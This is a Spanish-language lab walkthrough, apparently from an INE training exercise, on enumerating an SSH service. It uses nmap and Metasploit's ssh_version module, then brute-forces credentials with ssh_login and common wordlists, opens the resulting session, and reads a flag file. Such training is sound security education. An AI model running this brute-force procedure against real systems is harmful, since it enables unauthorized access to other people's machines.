# 🔑 Enumeración e Inicio de Sesión SSH

## 📡 Verificación y escaneo inicial

```bash
ping -c 4 demo.ine.local
```

El objetivo es accesible. Se prosigue con un escaneo detallado de puertos y servicios:

```bash
nmap -sS -sV demo.ine.local
```

## 🔍 Detección de la versión SSH

### Módulo `ssh_version`

```bash
msfconsole
use auxiliary/scanner/ssh/ssh_version
set RHOSTS demo.ine.local
exploit
```

Este módulo devuelve la versión exacta del servidor SSH en ejecución.

## 🔐 Fuerza bruta de credenciales

### Módulo `ssh_login`

Se emplean diccionarios de usuarios y contraseñas comunes. La opción `STOP_ON_SUCCESS` detiene el ataque en cuanto se encuentra la primera combinación válida.

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploit
```

| Opción | Valor |
|--------|-------|
| `USER_FILE` | `/usr/share/metasploit-framework/data/wordlists/common_users.txt` |
| `PASS_FILE` | `/usr/share/metasploit-framework/data/wordlists/common_passwords.txt` |
| `STOP_ON_SUCCESS` | `true` |
| `VERBOSE` | `true` |

## 🖥️ Sesión y búsqueda de bandera

Tras el éxito del ataque, se interactúa con la sesión abierta:

```bash
sessions
sessions -i 1
```

Dentro de la sesión se busca el archivo de bandera:

```bash
find / -name "flag"
cat /flag
```

La bandera aparece en el contenido del archivo y se captura para completar el laboratorio.

---

📌 La combinación de los módulos `ssh_version` y `ssh_login` permite tanto identificar el servicio como obtener acceso mediante credenciales débiles o comunes. Una vez dentro, la búsqueda del archivo `flag` entrega la recompensa del ejercicio.
